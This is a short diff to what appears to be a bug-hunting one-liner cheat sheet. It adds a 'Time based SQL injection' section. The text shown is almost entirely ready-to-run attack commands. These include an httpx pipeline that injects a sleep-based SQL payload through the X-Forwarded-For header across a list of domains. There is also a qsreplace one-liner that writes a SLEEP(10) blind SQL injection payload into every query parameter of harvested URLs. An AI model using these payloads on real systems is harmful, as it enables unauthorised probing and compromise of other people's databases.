@@ -40,6 +40,15 @@ cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%
 ```
 cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
 ```
+
+### Time based SQL injection
+
+1. apt install moreutils
+2. apt install parallel
+
+```
+cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
+```
 ────────────────────────────────────────────────────────────────────────
 
 
